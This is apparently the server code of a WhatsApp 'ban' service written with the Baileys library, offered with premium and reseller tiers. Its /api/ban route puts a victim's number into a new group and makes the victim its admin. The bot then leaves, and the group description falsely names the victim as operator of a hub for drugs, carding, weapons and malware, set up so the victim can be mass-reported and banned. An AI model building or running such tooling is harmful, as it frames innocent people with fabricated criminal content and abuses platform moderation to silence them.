console.clear();
const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const chalk = require('chalk');
const { default: makeWASocket, useMultiFileAuthState, delay, Browsers, DisconnectReason, fetchLatestBaileysVersion, jidDecode, downloadContentFromMessage, jidNormalizedUser } = require("@whiskeysockets/baileys");
const pino = require("pino"); // Added this
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- PAIRING ROUTE ---
app.post('/api/pair', async (req, res) => {
    let responseSent = false;
    let sock = null;

    try {
        const { phone } = req.body;
        if (!phone) return res.status(400).json({ error: 'Number required' });
        
        const cleanNumber = phone.replace(/\D/g, '');
        const sessionPath = path.join(__dirname, 'sessions', `temp_${cleanNumber}`);
        
        // Clean old session to force fresh pairing
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
        }
        
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        sock = makeWASocket({
            version,
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: Browsers.macOS('Chrome'),
            syncFullHistory: false,
            markOnlineOnConnect: true,
            printQRInTerminal: false,
            connectTimeoutMs: 120000,
            keepAliveIntervalMs: 30000,
            defaultQueryTimeoutMs: 60000
        });

        sock.ev.on('creds.update', saveCreds);

        let pairingCodeRequested = false;

        // Listen for connection updates - EXACTLY like pair.js
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            // CRITICAL: Wait for qr AND check not registered (EXACT match to pair.js)
            if (qr && !pairingCodeRequested && !sock.authState.creds.registered) {
                pairingCodeRequested = true;

                console.log(`[i] Requesting pairing code for: ${cleanNumber}`);
                
                // CRITICAL: 2-second delay before requesting (race condition fix from pair.js)
                await delay(2000);
                
                try {
                    const code = await sock.requestPairingCode(cleanNumber);
                    responseSent = true;
                    
                    console.log(`[✓] Pairing code generated: ${code}`);
                    
                    const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                    
                    res.json({ success: true, code: formattedCode });
                    
                    // Close socket after sending code (we don't need to keep it open for pairing)
                    setTimeout(() => sock?.end(), 5000);
                    
                } catch (err) {
                    console.error('[✗] Failed to get pairing code:', err.message);
                    pairingCodeRequested = false;
                    
                    if (!responseSent) {
                        responseSent = true;
                        res.status(500).json({ error: "WhatsApp Fail: " + err.message });
                    }
                }
            }

            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode !== DisconnectReason.loggedOut && !responseSent) {
                    // Don't auto-reconnect for API pairing requests
                }
            }
        });

        // 35-second timeout
        setTimeout(() => {
            if (!responseSent) {
                responseSent = true;
                sock?.end();
                res.status(500).json({ error: "WhatsApp Fail: Timeout" });
            }
        }, 35000);

    } catch (e) {
        if (!responseSent) {
            responseSent = true;
            res.status(500).json({ error: "Server Error: " + e.message });
        }
    }
});  

// ========== CONFIG ==========
const ACCESS_KEY = process.env.ACCESS_KEY || 'GHOST-BAN-2026';
const PORT = process.env.PORT || 3000;
// ========== PREMIUM DATABASE ==========
const PREMIUM_DB_PATH = path.join(__dirname, 'premium.json');
function loadPremiumDB() {
    if (!fs.existsSync(PREMIUM_DB_PATH)) return { premium: [], resellers: [] };
    try { return JSON.parse(fs.readFileSync(PREMIUM_DB_PATH)); } catch { return { premium: [], resellers: [] }; }
}
function savePremiumDB(data) { fs.writeFileSync(PREMIUM_DB_PATH, JSON.stringify(data, null, 2)); }
function isAdmin(userId) { return userId === 'admin'; }
function addPremium(userId) {
    const db = loadPremiumDB();
    if (!db.premium.includes(userId.toString())) { db.premium.push(userId.toString()); savePremiumDB(db); return true; }
    return false;
}
function removePremium(userId) {
    const db = loadPremiumDB();
    const idx = db.premium.indexOf(userId.toString());
    if (idx !== -1) { db.premium.splice(idx, 1); savePremiumDB(db); return true; }
    return false;
}
function getPremiumList() { return loadPremiumDB().premium; }

// ========== GROUP SETTINGS ==========
const GROUP_DESCRIPTION = "⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️\n\n💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀\n\n📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.\n\n💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.\n\n🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.\n\n🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.\n\n👤 **PRIMARY OPERATOR:** {target}\n\n⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE.";
const GROUP_PROFILE_PIC_PATH = path.join(__dirname, 'ghost_ban_profile.jpg');

// ========== BAILEYS SETUP ==========

const loadBaileys = async () => {
    console.log(chalk.green('✅ Baileys loaded'));
};
const activeWhatsAppConnections = new Map();

// ========== AUTH MIDDLEWARE ==========
function requireAuth(req, res, next) {
    const key = req.headers['x-access-key'] || req.query.key;
    if (key !== ACCESS_KEY) {
        return res.status(401).json({ error: '⛔ INVALID ACCESS KEY' });
    }
    next();
}

// ========== WHATSAPP FUNCTIONS ==========
async function startWhatsAppBot(phoneNumber) {
    const sessionPath = path.join(__dirname, `./sessions/session_${phoneNumber}`);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        syncFullHistory: false,
        markOnlineOnConnect: true,
        printQRInTerminal: false,
        connectTimeoutMs: 120000,
        keepAliveIntervalMs: 30000,
        defaultQueryTimeoutMs: 60000
    });

    activeWhatsAppConnections.set(phoneNumber, sock);
    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (connection === 'open') {
            console.log(chalk.green(`✅ ${phoneNumber}: Connected`));
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            activeWhatsAppConnections.delete(phoneNumber);
            if (statusCode !== DisconnectReason.loggedOut) {
                setTimeout(() => startWhatsAppBot(phoneNumber), 5000);
            }
        }
    });

    return sock;
}

// ========== PAIRING USING SUBPROCESS (like Anon-Bot) ==========
function spawnPairingProcess(phoneNumber) {
    return new Promise((resolve, reject) => {
        const cleanNumber = phoneNumber.replace(/\D/g, '');
        
        const pairScript = path.join(__dirname, 'pair.js');
        
        if (!fs.existsSync(pairScript)) {
            return reject(new Error('pair.js not found. Please add pair.js to your project.'));
        }

        console.log(chalk.cyan(`[i] Spawning pair.js for ${cleanNumber}`));
        
        const child = spawn('node', [pairScript, cleanNumber], {
            stdio: ['pipe', 'pipe', 'pipe']
        });

        let output = '';
        let code = null;
        let responseSent = false;

        child.stdout.on('data', (data) => {
            const chunk = data.toString();
            output += chunk;
            console.log(chalk.gray('[pair.js]'), chunk.trim());
            
            // Extract code using Anon-Bot pattern
            const match = output.match(/ANON_CODE_START:([A-Z0-9]+):ANON_CODE_END/);
            if (match && !code) {
                code = match[1];
                console.log(chalk.green(`[✓] Pairing code extracted: ${code}`));
            }
        });

        child.stderr.on('data', (data) => {
            console.error(chalk.red('[pair.js error]'), data.toString().trim());
        });

        child.on('close', (exitCode) => {
            if (!responseSent) {
                responseSent = true;
                if (code) {
                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
                    resolve({ success: true, pairingCode: formattedCode });
                } else {
                    reject(new Error('Pairing process ended without generating code'));
                }
            }
        });

        // 30 second timeout
        setTimeout(() => {
            if (!responseSent) {
                responseSent = true;
                child.kill();
                reject(new Error('Timeout - pairing code not generated within 30 seconds'));
            }
        }, 30000);
    });
}

// ========== API ROUTES ==========

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'alive', uptime: process.uptime(), connections: activeWhatsAppConnections.size });
});

// Ban target (create trap group)
app.post('/api/ban', requireAuth, async (req, res) => {
    const { targetNumber } = req.body;
    if (!targetNumber) return res.status(400).json({ error: 'Target number required' });

    const [firstPhone, sock] = activeWhatsAppConnections.entries().next().value || [];
    if (!sock) return res.status(400).json({ error: 'No WhatsApp connection. Pair first.' });

    try {
        const targetJid = targetNumber + '@s.whatsapp.net';
        const botJid = sock.user.id;

        const group = await sock.groupCreate('GHOST BAN TRAP', [botJid, targetJid]);
        const groupJid = group.id;

        await sock.groupParticipantsUpdate(groupJid, [targetJid], 'promote');
        await new Promise(r => setTimeout(r, 1000));
        await sock.groupParticipantsUpdate(groupJid, [botJid], 'demote');
        await new Promise(r => setTimeout(r, 1000));
        await updateGroupInfo(sock, groupJid);
        await new Promise(r => setTimeout(r, 1000));
        await sock.groupLeave(groupJid);

        res.json({ success: true, targetNumber, groupJid, message: 'Trap group created. Report manually.' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// List connections
app.get('/api/connections', requireAuth, (req, res) => {
    const connections = Array.from(activeWhatsAppConnections.keys());
    res.json({ connections, count: connections.length });
});

// Add premium
app.post('/api/addprem', requireAuth, (req, res) => {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ error: 'User ID required' });
    const added = addPremium(userId);
    res.json({ success: added, userId, message: added ? 'Premium added' : 'Already premium' });
});

// Remove premium
app.post('/api/delprem', requireAuth, (req, res) => {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ error: 'User ID required' });
    const removed = removePremium(userId);
    res.json({ success: removed, userId, message: removed ? 'Premium removed' : 'Not premium' });
});

// List premium
app.get('/api/listprem', requireAuth, (req, res) => {
    res.json({ premium: getPremiumList() });
});

// Update group info helper
async function updateGroupInfo(sock, groupJid) {
    await sock.groupUpdateDescription(groupJid, GROUP_DESCRIPTION);
    if (fs.existsSync(GROUP_PROFILE_PIC_PATH)) {
        const picBuffer = fs.readFileSync(GROUP_PROFILE_PIC_PATH);
        await sock.updateProfilePicture(groupJid, picBuffer);
    }
}

// ========== START SERVER ==========
async function main() {
    try {
        await loadBaileys();
        console.log(chalk.green('✅ Baileys loaded'));

        // Load saved sessions
        const sessionsDir = path.join(__dirname, 'sessions');
        if (fs.existsSync(sessionsDir)) {
            const sessions = fs.readdirSync(sessionsDir);
            for (const session of sessions) {
                if (session.startsWith('session_')) {
                    const phone = session.replace('session_', '');
                    console.log(chalk.cyan(`🔄 Loading session: ${phone}`));
                    await startWhatsAppBot(phone);
                }
            }
        }

        app.listen(PORT, () => {
            console.log(chalk.green(`🌐 Server running on port ${PORT}`));
            console.log(chalk.red(`🔑 Access Key: ${ACCESS_KEY}`));
        });

    } catch (error) {
        console.error(chalk.red('❌ Startup error:'), error);
        process.exit(1);
    }
}

main();
